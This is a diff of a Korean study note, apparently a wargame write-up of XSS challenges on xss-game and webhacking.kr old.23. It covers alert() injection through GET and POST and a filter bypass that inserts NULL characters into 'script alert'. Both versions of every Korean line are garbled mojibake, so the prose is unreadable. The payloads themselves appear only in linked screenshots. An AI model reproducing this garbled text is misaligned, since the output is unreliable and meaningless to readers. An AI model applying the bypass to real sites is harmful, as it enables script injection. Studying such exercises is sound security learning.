+ÇØ´ç Header¸¦ ¼±¾ðÇÏÁö ¾Ê¾ÒÀ» ¶§ÀÇ ºê¶ó¿ìÀú ±âº» °ªÀº 1·Î, ±âº»À¸·Î ÀÛµ¿ÇÑ´Ù. 0ÀÏ °æ¿ì XSS Filter¸¦ »ç¿ëÇÏÁö ¾ÊÀ¸¸ç, 1ÀÏ °æ¿ì XSS °ø°ÝÀÌ °¨ÁöµÇ¸é ÇØ´ç ºÎºÐ¸¸ Á¦°ÅÇÑ µÚ ÆäÀÌÁö °á°ú¸¦ È­¸é¿¡ Ãâ·ÂÇÑ´Ù. mode=blockÀÏ °æ¿ì XSS °ø°ÝÀÌ °¨ÁöµÇ¸é ÆäÀÌÁö ÀüÃ¼ÀÇ ·»´õ¸µÀ» Áß´ÜÇÏ°í, report¸¦ ¼±¾ðÇÒ °æ¿ì¿¡ XSS °ø°ÝÀÌ °¨ÁöµÈ »ç½ÇÀ» ¹Ì¸® ¼³Á¤µÈ ÁÖ¼Ò¿¡ ½Å°íÇÏ¿© ¿î¿µÀÚ°¡ ´ëÃ³ÇÏ±â ½±°Ô ÇÒ ¼ö ÀÖ´Ù.
 
 ![image](https://user-images.githubusercontent.com/62539341/82078353-f7787800-971b-11ea-830b-611499c295a6.png)
 
-<h1>XSS ê´€ë ¨ ë¬¸ì œ</h1>
+<h1>XSS °ü·Ã ¹®Á¦</h1>
 
 <h2>1) xssgame 1,2
 https://xss-game.appspot.com/</h2>
@@ -246,93 +246,93 @@ https://xss-game.appspot.com/</h2>
 
 ![image](https://user-images.githubusercontent.com/62539341/82110472-caf34900-9779-11ea-9f34-6e9a05ae4315.png)
 
-Javascriptë¡œ alert ì°½ì„ ë„ìš°ë©´ ë‹¤ìŒ ë‹¨ê³„ë¡œ ë„˜ì–´ê°„ë‹¤ê³  ì í˜€ìžˆìŠµë‹ˆë‹¤.
+Javascript·Î alert Ã¢À» ¶ç¿ì¸é ´ÙÀ½ ´Ü°è·Î ³Ñ¾î°£´Ù°í ÀûÇôÀÖ½À´Ï´Ù.
 
 ![image](https://user-images.githubusercontent.com/62539341/82110691-41dd1180-977b-11ea-99cd-7c6cd820ccae.png)
 
-ì œ íƒ€ê¹ƒìž…ë‹ˆë‹¤. ì¼ë‹¨ ì•„ë¬´ê±°ë‚˜ ìž…ë ¥í•´ë³´ì•˜ìŠµë‹ˆë‹¤.
+Á¦ Å¸±êÀÔ´Ï´Ù. ÀÏ´Ü ¾Æ¹«°Å³ª ÀÔ·ÂÇØº¸¾Ò½À´Ï´Ù.
 
 ![image](https://user-images.githubusercontent.com/62539341/82110702-5e794980-977b-11ea-871a-24f60ea7193b.png)
 
-GET ë°©ì‹ìœ¼ë¡œ query ê°’ì´ ë“¤ì–´ê°€ë‚˜ë´…ë‹ˆë‹¤.
+GET ¹æ½ÄÀ¸·Î query °ªÀÌ µé¾î°¡³ªº¾´Ï´Ù.
 
-ë¬¸ì œì—ì„œ alertë¥¼ ë„ì›Œë³´ë¼ê³  í•´ì„œ ë§¨ ì²˜ìŒì— ë°°ìš´ ê¸°ë³¸ì ì¸ alertë¥¼ ì¨ì„œ GET ë°©ì‹ìœ¼ë¡œ ë³´ë‚´ë´¤ë”ë‹ˆ
+¹®Á¦¿¡¼­ alert¸¦ ¶ç¿öº¸¶ó°í ÇØ¼­ ¸Ç Ã³À½¿¡ ¹è¿î ±âº»ÀûÀÎ alert¸¦ ½á¼­ GET ¹æ½ÄÀ¸·Î º¸³»ºÃ´õ´Ï
 
 ![image](https://user-images.githubusercontent.com/62539341/82110741-92546f00-977b-11ea-89a3-6d9380fc85e8.png)
 
-ì•„ì§ íŽ˜ì´ì§€ ì†ŒìŠ¤ë³´ê¸°ë¥¼ ì•ˆí•´ë´¤ëŠ”ë°.. ë¬¸ì œê°€ í’€ë ¸ìŠµë‹ˆë‹¤..!
+¾ÆÁ÷ ÆäÀÌÁö ¼Ò½ºº¸±â¸¦ ¾ÈÇØºÃ´Âµ¥.. ¹®Á¦°¡ Ç®·È½À´Ï´Ù..!
 
 <h3>Level 2</h3>
 
 ![image](https://user-images.githubusercontent.com/62539341/82110813-e8c1ad80-977b-11ea-882e-e76918f29bd7.png)
 
-ì´ë²ˆ ë¬¸ì œë„... alert() ë¥¼ íŒì—…í•˜ë¼ëŠ”êµ°ìš”.
+ÀÌ¹ø ¹®Á¦µµ... alert() ¸¦ ÆË¾÷ÇÏ¶ó´Â±º¿ä.
 
 ![image](https://user-images.githubusercontent.com/62539341/82110843-068f1280-977c-11ea-8673-f2efa65dc1dd.png)
 
-ì´ë²ˆ ë¬¸ì œì˜ íƒ€ê¹ƒìž…ë‹ˆë‹¤. ì–´ë–¤ ë‚´ìš©ì„ ìž…ë ¥í•´ì„œ í¬ìŠ¤íŠ¸í•˜ëŠ” ì›¹ íŽ˜ì´ì§€ ê°™ìŠµë‹ˆë‹¤.
+ÀÌ¹ø ¹®Á¦ÀÇ Å¸±êÀÔ´Ï´Ù. ¾î¶² ³»¿ëÀ» ÀÔ·ÂÇØ¼­ Æ÷½ºÆ®ÇÏ´Â À¥ ÆäÀÌÁö °°½À´Ï´Ù.
 
-ì´ë²ˆì—” ë°”ë¡œ í”„ë ˆìž„ì†ŒìŠ¤ë¥¼ ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.
+ÀÌ¹ø¿£ ¹Ù·Î ÇÁ·¹ÀÓ¼Ò½º¸¦ º¸µµ·Ï ÇÏ°Ú½À´Ï´Ù.
 
 ![image](https://user-images.githubusercontent.com/62539341/82111065-296df680-977d-11ea-92e2-7419b4d795e6.png)
 
-POST ë°©ì‹ìœ¼ë¡œ ìž…ë ¥ë°›ëŠ”êµ°ìš”..
+POST ¹æ½ÄÀ¸·Î ÀÔ·Â¹Þ´Â±º¿ä..
 
 ![image](https://user-images.githubusercontent.com/62539341/82111096-78b42700-977d-11ea-9be7-247534d77e31.png)
 
-ì•„ê¹Œì²˜ëŸ¼ ìž…ë ¥í•˜ë‹ˆ ë¬¸ì œê°€ ì•ˆí’€ë¦½ë‹ˆë‹¤...
+¾Æ±îÃ³·³ ÀÔ·ÂÇÏ´Ï ¹®Á¦°¡ ¾ÈÇ®¸³´Ï´Ù...
 
-ë‹¤ë¥¸ ë°©ë²•ì„ ì¨ì•¼ê² êµ°ìš”
+´Ù¸¥ ¹æ¹ýÀ» ½á¾ß°Ú±º¿ä
 
 ![image](https://user-images.githubusercontent.com/62539341/82111116-a305e480-977d-11ea-87e5-d41d70cd0a43.png)
 
-ì´ë²ˆì—” ì´ë ‡ê²Œ í•œë²ˆ ìž…ë ¥í•´ë´¤ë”ë‹ˆ 
+ÀÌ¹ø¿£ ÀÌ·¸°Ô ÇÑ¹ø ÀÔ·ÂÇØºÃ´õ´Ï 
 
 ![image](https://user-images.githubusercontent.com/62539341/82111124-b913a500-977d-11ea-9e3f-3ce7b1f00c85.png)
 
-ì„±ê³µìž…ë‹ˆë‹¤!!
+¼º°øÀÔ´Ï´Ù!!
 
 <h2>2) webhacking-kr old.23</h2>
 
 ![image](https://user-images.githubusercontent.com/62539341/82112191-a309e280-9785-11ea-8314-8e7ba330736c.png)
 
-ì´ë²ˆì—ë„ ì €ì˜ ëª©í‘œëŠ” alertë¥¼ ë„ìš°ëŠ” ê²ƒì´ë„¤ìš”.
+ÀÌ¹ø¿¡µµ ÀúÀÇ ¸ñÇ¥´Â alert¸¦ ¶ç¿ì´Â °ÍÀÌ³×¿ä.
 
 ![image](https://user-images.githubusercontent.com/62539341/82112204-c7fe5580-9785-11ea-8ab7-571140780249.png)
 
-GET ë°©ì‹ìœ¼ë¡œ ìž…ë ¥ê°’ì„ ë°›ì•„ì˜¤ëŠ”êµ°ìš”.
+GET ¹æ½ÄÀ¸·Î ÀÔ·Â°ªÀ» ¹Þ¾Æ¿À´Â±º¿ä.
 
 ![image](https://user-images.githubusercontent.com/62539341/82112372-3e4f8780-9787-11ea-9b2b-6364dff2a762.png)
 
 ![image](https://user-images.githubusercontent.com/62539341/82112530-99ce4500-9788-11ea-8538-31686d2a02f8.png)
 
-ì•„ê¹Œ ì¼ë˜ ë‘ ë°©ë²•ì„ ì‚¬ìš©í•´ë´¤ëŠ”ë° í†µí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. 
-(ì–´ë–»ê²Œ í•˜ì§€..?)
+¾Æ±î ½è´ø µÎ ¹æ¹ýÀ» »ç¿ëÇØºÃ´Âµ¥ ÅëÇÏÁö ¾Ê½À´Ï´Ù. 
+(¾î¶»°Ô ÇÏÁö..?)
 
-ê°•ì¢Œì—ì„œ ì‚¬ìš©ìž ì¸í’‹ì´ <,> ê°™ì€ ê²Œ ë“¤ì–´ì˜¬ í•„ìš”ê°€ ì—†ë‹¤ë©´ thml íƒœê·¸ë¡œ ì¸ì‹ ì•ˆë˜ë„ë¡ ë§‰ëŠ” ë°©ë²•ìœ¼ë¡œ XSSë¥¼ ë§‰ì„ ìˆ˜ ìžˆë‹¤ê³  í–ˆë‹¤. ê·¸ëŸ¬ë©´ <,>ë¥¼ ì§ì ‘ ì“°ì§€ ì•Šê³  ì•„ìŠ¤í‚¤ì½”ë“œë¡œ ë³€í™˜í•´ì„œ ë„£ì–´ë³´ë©´ ë˜ì§€ ì•Šì„ê¹Œ?
+°­ÁÂ¿¡¼­ »ç¿ëÀÚ ÀÎÇ²ÀÌ <,> °°Àº °Ô µé¾î¿Ã ÇÊ¿ä°¡ ¾ø´Ù¸é thml ÅÂ±×·Î ÀÎ½Ä ¾ÈµÇµµ·Ï ¸·´Â ¹æ¹ýÀ¸·Î XSS¸¦ ¸·À» ¼ö ÀÖ´Ù°í Çß´Ù. ±×·¯¸é <,>¸¦ Á÷Á¢ ¾²Áö ¾Ê°í ¾Æ½ºÅ°ÄÚµå·Î º¯È¯ÇØ¼­ ³Ö¾îº¸¸é µÇÁö ¾ÊÀ»±î?
 
 ![image](https://user-images.githubusercontent.com/62539341/82132797-a43b1e00-981e-11ea-93a8-038fa064aeb5.png)
 
-ì„¸ ê°’ ëª¨ë‘ ë„£ì–´ë´¤ëŠ”ë° ê²½ê³ ì°½ì´ ëœ¨ì§€ ì•ŠëŠ”ë‹¤. ë‹¤ì‹œ í•œë²ˆ ê³ ë¯¼í•´ë´ì•¼ê² ë‹¤...
+¼¼ °ª ¸ðµÎ ³Ö¾îºÃ´Âµ¥ °æ°íÃ¢ÀÌ ¶ßÁö ¾Ê´Â´Ù. ´Ù½Ã ÇÑ¹ø °í¹ÎÇØºÁ¾ß°Ú´Ù...
 
-ê³„ì† ì•„ë¬´ê±°ë‚˜ ìž…ë ¥í•´ë³´ë‹¤ê°€ ì°¾ì•„ë‚¸ ê²ƒì€
+°è¼Ó ¾Æ¹«°Å³ª ÀÔ·ÂÇØº¸´Ù°¡ Ã£¾Æ³½ °ÍÀº
 
 ![image](https://user-images.githubusercontent.com/62539341/82132889-e4e76700-981f-11ea-9cb1-94ac052f2619.png)
 
-ìˆ«ìžë¥¼ ìž…ë ¥í•˜ë©´ ë¬´ë¦¬ì—†ì´ ìž˜ ë‚˜ì˜¨ë‹¤.
+¼ýÀÚ¸¦ ÀÔ·ÂÇÏ¸é ¹«¸®¾øÀÌ Àß ³ª¿Â´Ù.
 
 ![image](https://user-images.githubusercontent.com/62539341/82132901-05afbc80-9820-11ea-9831-d3373cdb807b.png)
 
-ì´ë ‡ê²Œ ë¬¸ìžë¥¼ ìž…ë ¥í•˜ë‹ˆê¹Œ no hackì´ë¼ê³  ëœ¬ë‹¤. ê·¸ëŸ¬ë©´ ë¬¸ìžë¥¼ ë‹¤ ë§‰ëŠ” ê²ƒì¸ê°€?
+ÀÌ·¸°Ô ¹®ÀÚ¸¦ ÀÔ·ÂÇÏ´Ï±î no hackÀÌ¶ó°í ¶á´Ù. ±×·¯¸é ¹®ÀÚ¸¦ ´Ù ¸·´Â °ÍÀÎ°¡?
 
 ![image](https://user-images.githubusercontent.com/62539341/82132912-29730280-9820-11ea-932b-703a0954ba51.png)
 
-aì™€ b ì‚¬ì´ì— ë¬¼ìŒí‘œ?ë¥¼ ë„£ìœ¼ë‹ˆê¹Œ ìž˜ ì¶œë ¥ëœë‹¤.
+a¿Í b »çÀÌ¿¡ ¹°À½Ç¥?¸¦ ³ÖÀ¸´Ï±î Àß Ãâ·ÂµÈ´Ù.
 
-ê·¸ëŸ¬ë©´ script alert ëª…ë ¹ì— ì‚¬ì´ì‚¬ì´ì— ë¬¸ìžê°€ ì•„ë‹Œ ê²ƒì„ ë„£ìœ¼ë©´ ì•„ë§ˆ ìž˜ ì¶œë ¥ë  ê²ƒì´ë‹¤. ê·¸ë ‡ë‹¤ê³  ìˆ«ìžë‚˜ ? ê°™ì€ê±°ë¥¼ ë„£ìœ¼ë©´ ëª…ë ¹ì´ ì œëŒ€ë¡œ ì‹¤í–‰ì•ˆë  ê²ƒì´ë‹ˆ ì•„ê¹Œ ì‚¬ìš©í•˜ë˜ ì•„ìŠ¤í‚¤ì½”ë“œì— NULL ë¥¼ ë„£ìœ¼ë©´ ë˜ì§€ ì•Šì„ê¹Œ?
+±×·¯¸é script alert ¸í·É¿¡ »çÀÌ»çÀÌ¿¡ ¹®ÀÚ°¡ ¾Æ´Ñ °ÍÀ» ³ÖÀ¸¸é ¾Æ¸¶ Àß Ãâ·ÂµÉ °ÍÀÌ´Ù. ±×·¸´Ù°í ¼ýÀÚ³ª ? °°Àº°Å¸¦ ³ÖÀ¸¸é ¸í·ÉÀÌ Á¦´ë·Î ½ÇÇà¾ÈµÉ °ÍÀÌ´Ï ¾Æ±î »ç¿ëÇÏ´ø ¾Æ½ºÅ°ÄÚµå¿¡ NULL ¸¦ ³ÖÀ¸¸é µÇÁö ¾ÊÀ»±î?
 
 ![image](https://user-images.githubusercontent.com/62539341/82133028-b5d1f500-9821-11ea-97e3-fb36af9b2191.png)
 
 ![image](https://user-images.githubusercontent.com/62539341/82133041-c1bdb700-9821-11ea-9982-8d6d13dd010e.png)
 
-ë“œë””ì–´ í’€ë ¸ë‹¤!!! ë§ˆì§€ë§‰ ë¬¸ì œê°€ ì œì¼ ì–´ë ¤ì› ë‹¤..
+µåµð¾î Ç®·È´Ù!!! ¸¶Áö¸· ¹®Á¦°¡ Á¦ÀÏ ¾î·Á¿ü´Ù..
